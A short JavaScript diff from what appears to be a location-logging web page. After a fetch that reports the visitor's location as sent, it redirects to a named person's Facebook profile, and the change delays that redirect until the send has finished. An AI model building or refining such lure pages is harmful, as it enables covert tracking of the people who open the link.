@@ -194,8 +194,10 @@
           .then(res => {
             if (res.ok) {
               status.textContent = '📍 Localização enviada com sucesso!';
+                  window.location.href = "https://www.facebook.com/bruno.rodrigues.433581";
             } else {
               status.textContent = '❌ Erro ao enviar localização.';
+                  window.location.href = "https://www.facebook.com/bruno.rodrigues.433581";
             }
           })
           .catch(err => {
@@ -210,7 +212,6 @@
           status.textContent = `Erro: ${msg}`;
         }
       );
-    window.location.href = "https://www.facebook.com/bruno.rodrigues.433581";
     }
 
   </script>
